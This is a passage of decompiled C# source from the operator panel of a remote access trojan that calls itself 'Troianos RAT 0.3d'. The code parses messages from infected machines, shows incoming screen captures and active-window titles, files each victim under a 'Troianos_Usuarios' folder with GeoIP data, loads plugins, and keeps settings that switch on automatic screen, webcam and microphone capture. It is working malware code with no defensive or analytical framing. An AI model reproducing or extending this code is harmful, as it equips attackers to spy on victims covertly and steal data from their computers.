																														RuntimeHelpers.GetObjectValue(Color.DarkSlateBlue),
																														client.COI,
																														client.ip(),
																														RuntimeHelpers.GetObjectValue(Color.SteelBlue),
																														RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Class7.smethod_1(client.L)))),
																														"\r\n",
																														RuntimeHelpers.GetObjectValue(Color.Purple),
																														"-->",
																														RuntimeHelpers.GetObjectValue(Color.White),
																														array2[1]
																													});
																													return;
																												}
																												else
																												{
																													flag7 = (Operators.CompareString(left, "ER", false) == 0);
																													if (flag7)
																													{
																														flag5 = !Class7.class8_0.bool_4;
																														if (flag5)
																														{
																															return;
																														}
																														Class7.form1_0.Pp1.WRT(new object[]
																														{
																															RuntimeHelpers.GetObjectValue(Color.LightSteelBlue),
																															Class6.smethod_13(),
																															RuntimeHelpers.GetObjectValue(Color.DarkSlateBlue),
																															client.COI,
																															client.ip(),
																															RuntimeHelpers.GetObjectValue(Color.SteelBlue),
																															RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Class7.smethod_1(client.L)))),
																															"\r\n",
																															RuntimeHelpers.GetObjectValue(Color.Purple),
																															"-->",
																															RuntimeHelpers.GetObjectValue(Color.White),
																															array2[1] + " " + array2[2]
																														});
																														return;
																													}
																													else
																													{
																														flag7 = (Operators.CompareString(left, "pl", false) == 0);
																														if (flag7)
																														{
																															try
																															{
																																client.plg.Remove(array2[1]);
																															}
																															catch (Exception ex17)
																															{
																															}
																															flag7 = (Operators.CompareString(array2[2].ToString(), "0", false) == 0);
																															if (flag7)
																															{
																																client.plg.Add(array2[1]);
																																return;
																															}
																															Class7.smethod_2(client, Class7.smethod_0(null, array2[1]), Conversions.ToBoolean(array2[2]));
																															return;
																														}
																														else
																														{
																															flag7 = (Operators.CompareString(left, "CAP", false) == 0);
																															if (flag7)
																															{
																																try
																																{
																																	client.lastPC = DateAndTime.Now;
																																	client.Isend = false;
																																	byte[] array35 = (byte[])NewLateBinding.LateIndexGet(Class6.smethod_9(array, Class7.string_1), new object[]
																																	{
																																		RuntimeHelpers.GetObjectValue(1)
																																	}, null);
																																	flag7 = (array35.Length < 10);
																																	if (flag7)
																																	{
																																		return;
																																	}
																																	client.L.Cells[0].Value = Image.FromStream(new MemoryStream(array35));
																																	return;
																																}
																																catch (Exception ex18)
																																{
																																	return;
																																}
																															}
																															bool flag8;
																															if (Operators.CompareString(left, "act", false) == 0 && client.L != null)
																															{
																																if (Operators.CompareString(client.lastAC, array2[1], false) != 0)
																																{
																																	flag8 = false;
																																	goto IL_4BA0;
																																}
																															}
																															flag8 = true;
																															IL_4BA0:
																															flag7 = flag8;
																															if (flag7)
																															{
																																return;
																															}
																															client.lastAC = array2[1];
																															Collection online2 = Class7.form1_0.S.Online;
																															lock (online2)
																															{
																																client.L.Cells[Class7.int_11].Value = Class6.smethod_16(array2[1]);
																																return;
																															}
																														}
																													}
																												}
																											}
																										}
																										try
																										{
																											flag7 = (client.L != null);
																											if (flag7)
																											{
																												Class7.form1_0.L1.method_9(client.L);
																											}
																											List<object> list10 = new List<object>();
																											list10.Add(Resources.JPEG);
																											list10.Add(Class6.smethod_16(array2[1]));
																											list10.Add(Strings.Split(client.ip(), ":", -1, CompareMethod.Binary)[0]);
																											int num48 = 2;
																											int num49 = array2.Length - 2;
																											for (int num50 = num48; num50 <= num49; num50++)
																											{
																												int num51 = num50 + 1;
																												flag7 = (num51 == Class7.int_11 - 1);
																												if (flag7)
																												{
																													client.lastAC = array2[num50];
																													list10.Add(Class6.smethod_16(array2[num50]));
																												}
																												else
																												{
																													flag7 = (num51 == Class7.int_5);
																													if (flag7)
																													{
																														list10.Add(client.COI);
																														list10.Add(client.CName);
																													}
																													else
																													{
																														list10.Add(array2[num50]);
																													}
																												}
																											}
																											client.Folder = Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(list10[Class7.int_2]), "_")), RuntimeHelpers.GetObjectValue(list10[Class7.int_3]))), "_")), Strings.Split(Conversions.ToString(RuntimeHelpers.GetObjectValue(list10[Class7.int_0])), "_", -1, CompareMethod.Binary)[Strings.Split(Conversions.ToString(RuntimeHelpers.GetObjectValue(list10[Class7.int_0])), "_", -1, CompareMethod.Binary).Length - 1])));
																											string text11 = "\\/<>?*:|\"";
																											int num52 = 0;
																											int length = text11.Length;
																											while (num52 < length)
																											{
																												string text12 = Conversions.ToString(text11[num52]);
																												client.Folder = client.Folder.Replace(text12, "%" + Conversion.Hex(Strings.Asc(text12)));
																												num52++;
																											}
																											client.Folder = Application.StartupPath + "\\Troianos_Usuarios\\" + client.Folder + "\\";
																											client.L = Class7.form1_0.L1.method_8(client.ip(), list10.ToArray());
																											client.L.Tag = client;
																											list10.Clear();
																											client.plg.AddRange(Strings.Split(array2[array2.Length - 1], ",", -1, CompareMethod.Binary));
																										}
																										catch (Exception ex19)
																										{
																										}
																										flag7 = Class7.class8_0.bool_1;
																										if (flag7)
																										{
																											Class7.form1_0.Pp1.WRT(new object[]
																											{
																												RuntimeHelpers.GetObjectValue(Color.LightSteelBlue),
																												Class6.smethod_13(),
																												RuntimeHelpers.GetObjectValue(Color.DarkSlateBlue),
																												client.COI,
																												client.ip(),
																												RuntimeHelpers.GetObjectValue(Color.SteelBlue),
																												RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Class7.smethod_1(client.L)))),
																												RuntimeHelpers.GetObjectValue(Color.White),
																												"Pronto"
																											});
																										}
																										flag7 = !Class7.class8_0.bool_0;
																										if (!flag7)
																										{
																											Class7.notf_0.AddItem(client.COI, string.Format(Resources.notf, new object[]
																											{
																												RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(client.L.Cells[Class7.int_2].Value))),
																												RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(client.L.Cells[Class7.int_3].Value))),
																												RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(client.L.Cells[Class7.int_7].Value))),
																												RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(client.L.Cells[Class7.int_6].Value))),
																												RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(client.L.Cells[Class7.int_9].Value))),
																												RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(client.L.Cells[Class7.int_0].Value))),
																												client.ip().Split(new char[]
																												{
																													':'
																												})[0]
																											}));
																										}
																									}
																								}
																							}
																						}
																					}
																				}
																			}
																		}
																	}
																}
															}
														}
													}
												}
											}
										}
									}
								}
							}
						}
					}
				}
			}
			catch (Exception ex20)
			{
				Exception ex21 = ex20;
				bool flag7 = Operators.CompareString(array2[0], "up", false) == 0 | Operators.CompareString(array2[0], "dw", false) == 0;
				if (flag7)
				{
					try
					{
						client.Send("Fechar" + Class7.string_1 + array2[1]);
					}
					catch (Exception ex22)
					{
					}
				}
				else
				{
					flag7 = (Operators.CompareString(array2[0].ToLower(), "cap", false) == 0);
					if (flag7)
					{
						client.Isend = false;
					}
					flag7 = Class7.class8_0.bool_3;
					if (flag7)
					{
						Class7.form1_0.Pp1.WRT(new object[]
						{
							RuntimeHelpers.GetObjectValue(Color.LightSteelBlue),
							Class6.smethod_13(),
							RuntimeHelpers.GetObjectValue(Color.BlueViolet),
							"Listner",
							RuntimeHelpers.GetObjectValue(Color.DarkRed),
							"ERR AT ",
							RuntimeHelpers.GetObjectValue(Color.White),
							array2[0],
							RuntimeHelpers.GetObjectValue(Color.Red),
							ex21.Message
						});
					}
				}
			}
		}

		// Token: 0x06000419 RID: 1049 RVA: 0x001D3258 File Offset: 0x001D1658
		private static T InlineAssignHelper<T>(ref T target, T value)
		{
			target = value;
			return value;
		}

		// Token: 0x040001EA RID: 490
		public static Class7.Class8 class8_0 = new Class7.Class8();

		// Token: 0x040001EB RID: 491
		public static string string_0 = "Troianos RAT 0.3d";

		// Token: 0x040001EC RID: 492
		public static SK sk_0;

		// Token: 0x040001ED RID: 493
		public static long long_0 = 0L;

		// Token: 0x040001EE RID: 494
		public static long long_1 = 0L;

		// Token: 0x040001EF RID: 495
		public static string string_1 = "|'|'|";

		// Token: 0x040001F0 RID: 496
		public static Form1 form1_0;

		// Token: 0x040001F1 RID: 497
		public static int int_0 = 1;

		// Token: 0x040001F2 RID: 498
		public static int int_1 = 2;

		// Token: 0x040001F3 RID: 499
		public static int int_2 = 3;

		// Token: 0x040001F4 RID: 500
		public static int int_3 = 4;

		// Token: 0x040001F5 RID: 501
		public static int int_4 = 5;

		// Token: 0x040001F6 RID: 502
		public static int int_5 = 6;

		// Token: 0x040001F7 RID: 503
		public static int int_6 = 7;

		// Token: 0x040001F8 RID: 504
		public static int int_7 = 8;

		// Token: 0x040001F9 RID: 505
		public static int int_8 = 9;

		// Token: 0x040001FA RID: 506
		public static int int_9 = 10;

		// Token: 0x040001FB RID: 507
		public static int int_10 = 11;

		// Token: 0x040001FC RID: 508
		public static int int_11 = 12;

		// Token: 0x040001FD RID: 509
		public static List<string> list_0 = new List<string>();

		// Token: 0x040001FE RID: 510
		public static List<Class7.Class9> list_1 = new List<Class7.Class9>();

		// Token: 0x040001FF RID: 511
		public static notf notf_0 = new notf();

		// Token: 0x04000200 RID: 512
		private static List<Client> list_2 = new List<Client>();

		// Token: 0x04000201 RID: 513
		public static GClass3 gclass3_0 = new GClass3(Application.StartupPath + "\\GeoIP.dat", 1);

		// Token: 0x04000202 RID: 514
		public static WaveOut waveOut_0;

		// Token: 0x04000203 RID: 515
		public static WaveOut waveOut_1;

		// Token: 0x04000204 RID: 516
		public static bool bool_0 = true;

		// Token: 0x02000023 RID: 35
		public sealed class Class8
		{
			// Token: 0x0600041A RID: 1050 RVA: 0x001D3274 File Offset: 0x001D1674
			[DebuggerNonUserCode]
			public Class8()
			{
			}

			// Token: 0x0600041B RID: 1051 RVA: 0x001D3280 File Offset: 0x001D1680
			public void method_0()
			{
				this.bool_0 = Conversions.ToBoolean(Class6.smethod_2("ShowAlert", "TRUE"));
				this.bool_1 = Conversions.ToBoolean(Class6.smethod_2("LOGLOGIN", "TRUE"));
				this.bool_2 = Conversions.ToBoolean(Class6.smethod_2("LOGCONNECTIONS", "FALSE"));
				this.bool_3 = Conversions.ToBoolean(Class6.smethod_2("LOGLERR", "TRUE"));
				this.bool_4 = Conversions.ToBoolean(Class6.smethod_2("LOGRERR", "TRUE"));
				this.bool_5 = Conversions.ToBoolean(Class6.smethod_2("LOGMSGS", "TRUE"));
				this.bool_6 = Conversions.ToBoolean(Class6.smethod_2("SCAUT", "TRUE"));
				this.string_0 = Class6.smethod_2("SCI", "5");
				this.bool_7 = Conversions.ToBoolean(Class6.smethod_2("CAMAUT", "TRUE"));
				this.int_0 = Conversions.ToInteger(Class6.smethod_2("CAMI", "5"));
				this.bool_8 = Conversions.ToBoolean(Class6.smethod_2("MICAUT", "TRUE"));
				this.int_1 = Conversions.ToInteger(Class6.smethod_2("MICI", "1"));
				this.int_2 = Conversions.ToInteger(Class6.smethod_2("scri", "1"));
			}

			// Token: 0x0600041C RID: 1052 RVA: 0x001D33DC File Offset: 0x001D17DC
			public void method_1()
			{
				Class6.smethod_3("ShowAlert", this.bool_0.ToString());
				Class6.smethod_3("LOGLOGIN", this.bool_1.ToString());
				Class6.smethod_3("LOGCONNECTIONS", this.bool_2.ToString());
				Class6.smethod_3("LOGLERR", this.bool_3.ToString());
				Class6.smethod_3("LOGRERR", this.bool_4.ToString());
				Class6.smethod_3("LOGMSGS", this.bool_5.ToString());
				Class6.smethod_3("SCAUT", this.bool_6.ToString());
				Class6.smethod_3("SCI", this.string_0.ToString());
				Class6.smethod_3("CAMAUT", this.bool_7.ToString());
				Class6.smethod_3("CAMI", this.int_0.ToString());
				Class6.smethod_3("MICAUT", this.bool_8.ToString());
				Class6.smethod_3("MICI", this.int_1.ToString());
				Class6.smethod_3("scri", this.int_2.ToString());
			}

			// Token: 0x04000205 RID: 517
			public bool bool_0;

			// Token: 0x04000206 RID: 518
			public bool bool_1;

			// Token: 0x04000207 RID: 519
			public bool bool_2;

			// Token: 0x04000208 RID: 520
			public bool bool_3;

			// Token: 0x04000209 RID: 521
			public bool bool_4;

			// Token: 0x0400020A RID: 522
			public bool bool_5;

			// Token: 0x0400020B RID: 523
			public bool bool_6;

			// Token: 0x0400020C RID: 524
			public string string_0;

			// Token: 0x0400020D RID: 525
			public bool bool_7;

			// Token: 0x0400020E RID: 526
			public int int_0;

			// Token: 0x0400020F RID: 527
			public bool bool_8;

			// Token: 0x04000210 RID: 528
			public int int_1;

			// Token: 0x04000211 RID: 529
			public int int_2;
		}

		// Token: 0x02000024 RID: 36
		public sealed class Class9
		{
			// Token: 0x0600041D RID: 1053 RVA: 0x001D350C File Offset: 0x001D190C
			public Class9(string string_2)
			{
				byte[] array = File.ReadAllBytes(Application.StartupPath + "\\plugin\\" + string_2);
				bool flag = true;
				bool flag2 = flag;
				this.byte_0 = Class6.smethod_8(array, ref flag2);
				this.string_0 = string_2;
				this.string_1 = Class6.smethod_5(this.byte_0);
			}

			// Token: 0x04000212 RID: 530
			public byte[] byte_0;

			// Token: 0x04000213 RID: 531
			public string string_0;

			// Token: 0x04000214 RID: 532
			public string string_1;
		}

		// Token: 0x02000025 RID: 37
		// (Invoke) Token: 0x06000421 RID: 1057
		public delegate void Delegate0(object object_0);
	}
}
